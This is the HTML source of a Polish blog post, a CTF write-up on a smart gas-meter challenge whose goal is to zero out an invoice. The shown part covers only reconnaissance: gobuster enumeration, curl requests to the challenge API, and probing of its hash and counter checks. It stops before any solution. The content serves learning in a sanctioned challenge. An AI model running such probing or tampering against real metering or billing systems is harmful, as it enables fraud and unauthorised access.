@@ -1,0 +1,603 @@
+<!doctype html><html lang=pl><head><title>Smart Metering Challenge + bonus :: FoxtrotLabs — Tam gdzie bajty mówią dobranoc</title>
+<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="S w skrócie IoT pochodzi od Security
+Ktoś Mądry
+0x01 - Hackowanie IoT Czasami czytając genialne artykuły Phracka, które stały się ikonicznymi dziełami Hackerów spędzam trochę czasu nad rozmyslaniami, że drzewiej to i nostalgia była lepsza ;) Przed wejściem w XXI wiek mitygacje były dużo bardziej prymitywne (o ile były, bo StackGuardy, NX - czy jak go Intel reklamował XD - a także ASRL to lata 1990-2000 jeśli chodzi o architektury x86)."><meta name=keywords content="hacking"><meta name=robots content="noodp"><link rel=canonical href=https://foxtrotlabs.cc/pl/2020/06/smart-metering-challenge--bonus/><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://foxtrotlabs.cc/assets/style.css><link rel=stylesheet href=assets/%25!s%28%3cnil%3e%29.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=https://foxtrotlabs.cc/avatar/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="pl"><meta property="og:type" content="article"><meta property="og:title" content="Smart Metering Challenge + bonus :: FoxtrotLabs"><meta property="og:description" content="S w skrócie IoT pochodzi od Security
+Ktoś Mądry
+0x01 - Hackowanie IoT Czasami czytając genialne artykuły Phracka, które stały się ikonicznymi dziełami Hackerów spędzam trochę czasu nad rozmyslaniami, że drzewiej to i nostalgia była lepsza ;) Przed wejściem w XXI wiek mitygacje były dużo bardziej prymitywne (o ile były, bo StackGuardy, NX - czy jak go Intel reklamował XD - a także ASRL to lata 1990-2000 jeśli chodzi o architektury x86)."><meta property="og:url" content="https://foxtrotlabs.cc/pl/2020/06/smart-metering-challenge--bonus/"><meta property="og:site_name" content="Smart Metering Challenge + bonus"><meta property="og:image" content="https://foxtrotlabs.cc/avatar/favicon.ico"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-06-07 22:45:38 +0200 +0200"></head><body><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=https://foxtrotlabs.cc/pl><div class=logo>foxtrotlabs-pl</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=https://foxtrotlabs.cc/pl/posts>posty</a></li><li><a href=https://foxtrotlabs.cc/>English side</a></li><li><a href=https://foxtrotlabs.cc/pl/about>o mnie</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=https://foxtrotlabs.cc/pl/posts>posty</a></li><li><a href=https://foxtrotlabs.cc/>English side</a></li><li><a href=https://foxtrotlabs.cc/pl/about>o mnie</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul></nav><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script></header><div class=content><div class=post><h1 class=post-title><a href=https://foxtrotlabs.cc/pl/2020/06/smart-metering-challenge--bonus/>Smart Metering Challenge + bonus</a></h1><div class=post-meta><span class=post-date>2020-06-07</span></div><span class=post-tags>#<a href=https://foxtrotlabs.cc/pl/tags/iot/>iot</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/pl/tags/hacking/>hacking</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/pl/tags/ctf/>ctf</a>&nbsp;
+#<a href=https://foxtrotlabs.cc/pl/tags/easychalls/>easychalls</a>&nbsp;</span><div class=post-content><div><blockquote><p><code>S</code> w skrócie IoT pochodzi od <code>Security</code></p></blockquote><p><em>Ktoś Mądry</em></p><h1 id=0x01---hackowanie-iot>0x01 - Hackowanie IoT<a href=#0x01---hackowanie-iot class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Czasami czytając genialne artykuły Phracka, które stały się ikonicznymi dziełami Hackerów spędzam trochę czasu nad rozmyslaniami, że drzewiej to i nostalgia była lepsza ;) Przed wejściem w XXI wiek mitygacje były dużo bardziej prymitywne (o ile były, bo StackGuardy, NX - czy jak go Intel reklamował <code>XD</code> - a także ASRL to lata 1990-2000 jeśli chodzi o architektury x86). Prawdziwy raj dla hacker-wannabe oraz zmora administratorów. Na szczęście w dobie szerzącej się mody na IoT nowi adepci sztuki hackowania mogą uczyć się i próbować exploitować podatności systemów, które najczęściej powstają na prędce tylko po to, żeby zdążyć z releasem. Błędy logiczne, memory corruption czy wreszcie bugi w hardware to nie tylko tzw. &ldquo;low hanging fruits&rdquo; ale także ciekawe wyzwanie dzisiejszych czasów. Testy bezpieczeństwa urządzeń Internetu Rzeczy pozwalają powrócić do czasów beztroskiej eksploitacji bofów albo wymusić naukę podstaw elektroniki. Osobiście uważam, że to jedna z najciekawszych działek security zaraz po binary exploitation architektur takich jak x86(wszystkie bity), a zarazem bardzo ważna - skutki ataków moga być katastrofalne. Całe szczęście coraz więcej firm kładzie nacisk na testowanie swoich rozwiązań. To wymusza też na nas - badaczach bezpieczeństwa - poznanie celu. Dlatego cieszy mnie kolejne zadanie CTFowe, które dotyka działu IoT. Zadanie proste, ale dostarczające zabawy :)</p><h1 id=0x02---opis-zadania---co-hackujemy>0x02 - Opis zadania - co hackujemy?<a href=#0x02---opis-zadania---co-hackujemy class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Wyzwanie zostało przygotowane przez Grzegorza Sowę i opisane <a href=https://wladcysieci.pl/2020/05/28/pierwszy-konkurs-wladcy-sieci-smart-metering-challenge/>tutaj</a>. Sama &ldquo;infrastruktura&rdquo; a właściwie API, które jest wykorzystywane przez miernik znajduje się (w czasie pisania tego writeupu - 08.06.2020) <a href=https://gas-challenge.herokuapp.com/>tutaj</a>. Zamysłem zadania było manipulowanie systemem tak, aby rachunek za gaz wyniósł okrągłe 0.00 PLN.</p><p>O stronie wcześniej nie słyszałem, ale widząc, że przez tydzień nikt nie podesłał rozwiązania (sic!) po prostu musiałem się z nim zmierzyć. Za główny cel postawiłem sobie zdążyć przed wypuszczeniem kolejnych podpowiedzi przez organizatorów. Następna miała trafić na stronę 05.06.2020.</p><p>Wywołując metodę <code>GET</code> na <code>/</code> wyzwania</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X GET https://gas-challenge.herokuapp.com      
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>68</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;44-w0zLfctjIs1uEUcM2KChz62Dhi4&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 07:32:47 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>available methods:&lt;/br&gt;GET /counter&lt;br&gt;POST /counter&lt;br&gt;GET /invoice%     
+</span></span></code></pre></div><p>otrzymujemy listę endpointów oraz metod przez nie obsługiwanych. Nie są to wszystkie endpointy serwowane przez to RESTowe API. Co udowadnia próba słownikowego odgadnięcia innych końcówek.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ gobuster dir -u https://gas-challenge.herokuapp.com -k -w ~/tools/dirb/wordlists/big.txt -t <span style=color:#ae81ff>30</span>  -r --wildcard -s 200,301
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>Gobuster v3.1.0
+</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:            https://gas-challenge.herokuapp.com
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:         GET
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:        <span style=color:#ae81ff>30</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:       /****/****/*****/wordlists/big.txt
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Status codes:   200,301
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:     gobuster/3.1.0
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Follow Redir:   true
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:        10s
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>2020/06/08 07:34:37 Starting gobuster in directory enumeration mode
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>/Stats <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span>         
+</span></span><span style=display:flex><span>/counter <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span>         
+</span></span><span style=display:flex><span>/invoice <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span>         
+</span></span><span style=display:flex><span>/stats <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span>            
+</span></span><span style=display:flex><span>                                
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span><span style=display:flex><span>2020/06/08 07:35:20 Finished
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
+</span></span></code></pre></div><p>Dodatkowo mamy jeszcze możliwość sprawdzenia <code>/stats</code>, które mówią o statystykach wykonanych zapytań:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp 42s ❯ curl -ksi -X GET https://gas-challenge.herokuapp.com/stats                                                              
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>37</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;25-TCV2EiKRuGR77MQgef+oelRp9dU&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 07:36:49 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>get: <span style=color:#ae81ff>153</span> post:0 validposts:0 solved:0%  
+</span></span></code></pre></div><p>Nie wiem czy to założenia Autora, czy może jakiś bug/specyfika heroku, ale zauważyłem, że statystyki jak i odczyty są resetowane codziennie. Wraz z resetem (który ma miejsce w godzinach wieczornych czasu CEST), przybywa kolejny pomiar.</p><p>Pomiary dostępne są pod URI <code>/counter</code>, które przyjmuje także parametr <code>day</code>, specyfikujący datę pomiaru. Dni są liczone od 1. Na dzień dzisiejszy pomiary kończą się na 159 o czym można się przekonać wysyłając zapytanie <code>GET</code> bez wyróżnionego dnia.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># ostatni dzień</span>
+</span></span><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X GET https://gas-challenge.herokuapp.com/counter
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>80</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;50-JWSrp8Zt4KiljvrkkSbfnmNr5rY&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 07:41:37 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;day&#34;</span>:159,<span style=color:#e6db74>&#34;counter&#34;</span>:4562,<span style=color:#e6db74>&#34;hash&#34;</span>:<span style=color:#e6db74>&#34;dViMLvcGbtRlw+R6dYNyj7/U13XpElDEyZTfWIjOI4Q=&#34;</span><span style=color:#f92672>}</span>% 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># pierwszy dzień</span>
+</span></span><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X GET https://gas-challenge.herokuapp.com/counter<span style=color:#ae81ff>\?</span>day<span style=color:#ae81ff>\=</span><span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>78</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;4e-S+TACs9lDHctTUlLOaEiN+2mwaA&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 07:41:58 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;day&#34;</span>:1,<span style=color:#e6db74>&#34;counter&#34;</span>:4249,<span style=color:#e6db74>&#34;hash&#34;</span>:<span style=color:#e6db74>&#34;oujzc9j3BhMmuQz0jeNe/kXI5FwuFsCRMGdWgHgqjd4=&#34;</span><span style=color:#f92672>}</span>%                                                                               
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># niepoprawne zapytanie</span>
+</span></span><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X GET https://gas-challenge.herokuapp.com/counter<span style=color:#ae81ff>\?</span>day<span style=color:#ae81ff>\=</span><span style=color:#ae81ff>0</span>     
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 07:42:56 GMT
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span></code></pre></div><p>Dodatkowo API udostępnia jeszcze endpoint <code>/invoice</code>, który pozwala pobrać obecne rozliczenie:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X GET https://gas-challenge.herokuapp.com/invoice        
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>83</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;53-paIgqbwzBd5BirV6mARKOVUi3AE&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 07:44:28 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;Jan Kowalski&#34;</span>,<span style=color:#e6db74>&#34;days&#34;</span>:159,<span style=color:#e6db74>&#34;comment&#34;</span>:<span style=color:#e6db74>&#34;Faktura za rok 2020&#34;</span>,<span style=color:#e6db74>&#34;amount&#34;</span>:3608.89<span style=color:#f92672>}</span>%  
+</span></span></code></pre></div><p>Aby rozwiązać zadanie musimy wyzerować wartość &ldquo;amount&rdquo;.</p><h1 id=0x03-poprawny-post-i-jesteśmy-w-domu>0x03 Poprawny POST i jesteśmy w domu<a href=#0x03-poprawny-post-i-jesteśmy-w-domu class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Oprócz opisanych wyżej metod <code>GET</code> endpoint <code>/counter</code> przyjmuje także zapytania <code>POST</code>. Zgodnie ze specyfikacją podaną na stronie zapytanie to ma nastepującą postać:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X POST https://gas-challenge.herokuapp.com/counter -d <span style=color:#e6db74>&#39;{&#34;day&#34;:153,&#34;counter&#34;:3519,&#34;hash&#34;:&#34;nR0NR0Yq1kTp6dxUCysxDYF8PeL7x5H0Xdf6deqFFbe=&#34;}&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span>
+</span></span></code></pre></div><p>JSON wysyłany do API składa się z trzech pól. Dnia, wartości licznika oraz hasha. W przypadku, gdy zabraknie któregokolwiek API zwraca błąd:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># zapytanie bez pola day w JSONie</span>
+</span></span><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X POST https://gas-challenge.herokuapp.com/counter -d <span style=color:#e6db74>&#39;{&#34;counter&#34;:3519,&#34;hash&#34;:&#34;nR0NR0Yq1kTp6dxUCysxDYF8PeL7x5H0Xdf6deqFFbe=&#34;}&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> 
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>58</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;3a-uMBGfFce/4H5dzn9QsAi3ojq7RM&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 07:54:59 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>invalid json content - expected fields: day, counter, hash%    
+</span></span></code></pre></div><p>Zawartość zapytania musi więc zawierać te trzy pola. Dodatkowo warto zauważyć jedną ciekawą rzecz. Możemy zrobić <code>POST</code> na dowolny dzień z zakresu [1, N), gdzie N to liczba pomiarów. Zapytanie dla dnia N-tego zawsze kończy się błędem, nawet robiąć <code>POST</code> z danymi, które są zwracane przez API. Nie wiem czy to bug czy zamierzone działanie. Stawiam, że założenia projektowe, służące do ukierunkowania na jedno prawidłowe rozwiązanie.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># POST N-tego dnia</span>
+</span></span><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X POST https://gas-challenge.herokuapp.com/counter -d <span style=color:#e6db74>&#39;{&#34;day&#34;:159,&#34;counter&#34;:4562,&#34;hash&#34;:&#34;dViMLvcGbtRlw+R6dYNyj7/U13XpElDEyZTfWIjOI4Q=&#34;}&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span> 
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>21</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;15-JLxC8zrLD+GxFN8bOq29RGyBkZ8&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 08:05:23 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>invalid counter value%     
+</span></span></code></pre></div><p>W odróżnieniu od powyższego przypadku zapytanie dla dnia N-1 czyli 158 powiedzie się:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X POST https://gas-challenge.herokuapp.com/counter -d <span style=color:#e6db74>&#39;{&#34;day&#34;:158,&#34;counter&#34;:4559,&#34;hash&#34;:&#34;PfKcgUq+0untCd1D4PPCTiuTpzRUddf3CrVj6llRJro=&#34;}&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span>
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;2-eoX0dku9ba8cNUXvu/DyeabcC+s&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 08:06:05 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ok%     
+</span></span></code></pre></div><p>Jednocześnie każda zmiana wartości w wysyłanym JSONie powoduje błąd. Niewielka zmiana licznika, powoduje, że zapytanie zostaje odrzucone z powodu nieprawidłowej wartości hasha:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X POST https://gas-challenge.herokuapp.com/counter -d <span style=color:#e6db74>&#39;{&#34;day&#34;:158,&#34;counter&#34;:4558,&#34;hash&#34;:&#34;PfKcgUq+0untCd1D4PPCTiuTpzRUddf3CrVj6llRJro=&#34;}&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span>
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;c-+XUO5+u9bWlqZyZo2CUI6BPH5VY&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 08:08:46 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>invalid hash% 
+</span></span></code></pre></div><p>Jednocześnie gdy w JSONie zostanie podany dzień spoza zakresu serwer zwraca analogiczny błąd:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X POST https://gas-challenge.herokuapp.com/counter -d <span style=color:#e6db74>&#39;{&#34;day&#34;:200,&#34;counter&#34;:4558,&#34;hash&#34;:&#34;PfKcgUq+0untCd1D4PPCTiuTpzRUddf3CrVj6llRJro=&#34;}&#39;</span> -H <span style=color:#e6db74>&#34;Content-Type: application/json&#34;</span>
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>400</span> Bad Request
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: text/html; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>17</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;11-X5BWUjuTftsl7DgXOMCfA14kts4&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 08:13:56 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>invalid day value% 
+</span></span></code></pre></div><p>Podając pomiar dla poprawnego dnia, którego wartość poniżej odczytu z nia poprzedniego powoduje również błąd:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~/devp/tmp ❯ curl -ksi -X GET https://gas-challenge.herokuapp.com/counter<span style=color:#ae81ff>\?</span>day<span style=color:#ae81ff>\=</span><span style=color:#ae81ff>157</span>
+</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Server: Cowboy
+</span></span><span style=display:flex><span>Connection: keep-alive
+</span></span><span style=display:flex><span>X-Powered-By: Express
+</span></span><span style=display:flex><span>Content-Type: application/json; charset<span style=color:#f92672>=</span>utf-8
+</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>80</span>
+</span></span><span style=display:flex><span>Etag: W/<span style=color:#e6db74>&#34;50-fqWH35Jz3osHJmEyHykezow+yFw&#34;</span>
+</span></span><span style=display:flex><span>Date: Mon, <span style=color:#ae81ff>08</span> Jun <span style=color:#ae81ff>2020</span> 08:14:57 GMT
+</span></span><span style=display:flex><span>Via: 1.1 vegur
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>{</span><span style=color:#e6db74>&#34;day&#34;</span>:157,<span style=color:#e6db74>&#34;counter&#34;</span>:4557,<span style=color:#e6db74>&#34;hash&#34;</span>:<span style=color:#e6db74>&#34;9nFJCfjXK3N8SVjMHOrehu+743/pVll12SLV8074d0Q=&#34;</span><span style=color:#f92672>}</span>
